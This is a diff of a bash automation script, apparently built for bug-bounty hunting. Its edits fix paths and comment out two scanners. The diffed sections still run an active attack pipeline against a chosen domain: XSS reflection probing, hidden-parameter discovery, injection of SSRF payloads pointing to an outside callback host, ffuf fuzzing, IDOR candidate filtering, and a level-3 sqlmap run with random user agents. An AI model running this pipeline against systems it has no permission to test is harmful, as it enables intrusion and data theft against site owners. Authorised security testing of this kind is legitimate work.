@@ -53,10 +53,10 @@ vulnscan()
 {
   cd "$current"/"$domain"/"$subdirectory"/subdomains/
 #Jaeles Scanner
-  mkdir ../vulns/jaeles_result
-  jaeles scan -U "$domain"_unique.txt -c 150 -L 2 -o ../vulns/jaeles_result -s "/root/.jaeles/base-signatures/all/.*"
+#  mkdir ../vulns/jaeles_result
+ # jaeles scan -U "$domain"_unique.txt -c 150 -L 2 -o ../vulns/jaeles_result -s "/root/.jaeles/base-signatures/all/.*"
 #Nuclei Scanner
-  nuclei -c 200 -l "$domain"_unique.txt -silent -t all/ -o ../vulns/nuclei_result.txt
+#  nuclei -c 200 -l "$domain"_unique.txt -silent -t all/ -o ../vulns/nuclei_result.txt
 #XSS parameter scanning
   cd ../URLs/
   cat clean_url.txt | grep "=" | kxss | tee -a ../vulns/xss_reflection_kxss.txt
@@ -71,7 +71,7 @@ vulnscan()
   fi
 
 #Hidden parameter discovery
-  cp ../subdomain/"$domain"_unique.txt /root/scripts/bounty/Arjun/
+  cp ../subdomains/"$domain"_unique.txt /root/scripts/bounty/Arjun/
   cd /root/scripts/bounty/Arjun/
   python3 arjun.py --urls "$domain"_unique.txt --get -t 100 -o arjun_result.json
   mv arjun_result.json "$current"/"$domain"/"$subdirectory"/URLs/
@@ -81,7 +81,7 @@ vulnscan()
   ss=http://ssrftest.com/x/kVTj1
   cd "$current"/"$domain"/"$subdirectory"/URLs/
   cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | grep "=" | gf ssrf | tee -a ../vulns/possible_ssrf.txt
-  cat ../vulns/possible_ssrf.txt | sed 's|$|\&dest=$ss\&redirect=$ss\&uri=$ss\&path=$ss\&continue=$ss\&url=$ss\&window=$ss\&next=$ss\&data=$ss\&reference=$ss\&site=$ss\&html=$ss\&val=$ss\&validate=$ss\&domain=$ss\&callback=$ss\&return=$ss\&page=$ss\&feed=$ss\&host=$ss&\port=$ss\&to=$ss\&out=$ss\&view=$ss\&dir=$ss\&show=$ss\&navigation=$ss\&open=$ss|g' | tee -a ../vulns/possible_ssrf_2.txt
+  cat ../vulns/possible_ssrf.txt | sed 's|$|\&dest="$ss"\&redirect="$ss"\&uri="$ss"\&path="$ss"\&continue="$ss"\&url="$ss"\&window="$ss"\&next="$ss"\&data="$ss"\&reference="$ss"\&site="$ss"\&html="$ss"\&val="$ss"\&validate="$ss"\&domain="$ss"\&callback="$ss"\&return="$ss"\&page="$ss"\&feed="$ss"\&host="$ss"&\port="$ss"\&to="$ss"\&out="$ss"\&view="$ss"\&dir="$ss"\&show="$ss"\&navigation="$ss"\&open="$ss"|g' | tee -a ../vulns/possible_ssrf_2.txt
   ffuf -w ../vulns/possible_ssrf_2.txt -u FUZZ -t 100
 #IDOR
   cat clean_url.txt spider_clean_1.txt spider_clean_2.txt | grep "=" | gf idor | tee -a ../vulns/possible_idor.txt
@@ -110,7 +110,7 @@ vulnscan()
         echo -e "\e[92m[~] File found with content.."
 	if [ "$a" -gt "$b" ]
 	then
-		cp possible_sqli.txt /root/scripts/bounty/sqlmap-dev/ && python3 sqlmap.py -m possible_sqli.txt --threads 10 --batch --random-agent --level 3 --output-dir="$current"/"$domain"/"$subdirectory"/vulns/sql_result/
+		cp possible_sqli.txt /root/scripts/bounty/sqlmap-dev/ && python3 /root/scripts/bounty/sqlmap-dev/sqlmap.py -m possible_sqli.txt --threads 10 --batch --random-agent --level 3 --output-dir="$current"/"$domain"/"$subdirectory"/vulns/sql_result/
 	else
 		echo -e "\e[92m[~] File with more than $a line will not be scanned.."
 	fi
@@ -126,8 +126,8 @@ spider()
    cd "$current"/"$domain"/"$subdirectory"/subdomains/
    gospider -S "$domain"_unique.txt -o ../URLs/crawl_data/ -t 30 -c 10 -r -a
    cd ../URLs/crawl_data/
-   cat * | grep -v -E "(.jpg|.JPG|.png|.svg|.gif|.ttf|.css|.js|.pdf|.mp4|.mp3|.woff|.eot|.jpeg|.exe|.woff2)" | grep "=" | grep "code-200" | cut -d " " -f 5 | qsreplace -a | tee -a ../spider_clean_1.txt
-   cat * | grep -v -E "(.jpg|.JPG|.png|.svg|.gif|.ttf|.css|.js|.pdf|.mp4|.mp3|.woff|.eot|.jpeg|.exe|.woff2)" | grep "=" | grep "other-sources" | cut -d "-" -f 3 | tr -d " " | qsreplace -a | tee -a ../spider_clean_2.txt
+   cat * | grep -v -E "(.jpg|.JPG|.png|.svg|.gif|.ttf|.css|.js|.pdf|.mp4|.mp3|.woff|.eot|.jpeg|.exe|.woff2)" | grep "=" | grep "code-200" | cut -d " " -f 5 | qsreplace -a | tee -a ../URLs/spider_clean_1.txt
+   cat * | grep -v -E "(.jpg|.JPG|.png|.svg|.gif|.ttf|.css|.js|.pdf|.mp4|.mp3|.woff|.eot|.jpeg|.exe|.woff2)" | grep "=" | grep "other-sources" | cut -d "-" -f 3 | tr -d " " | qsreplace -a | tee -a ../URLs/spider_clean_2.txt
    cd ../
    if [ -z "$module" ]
    then
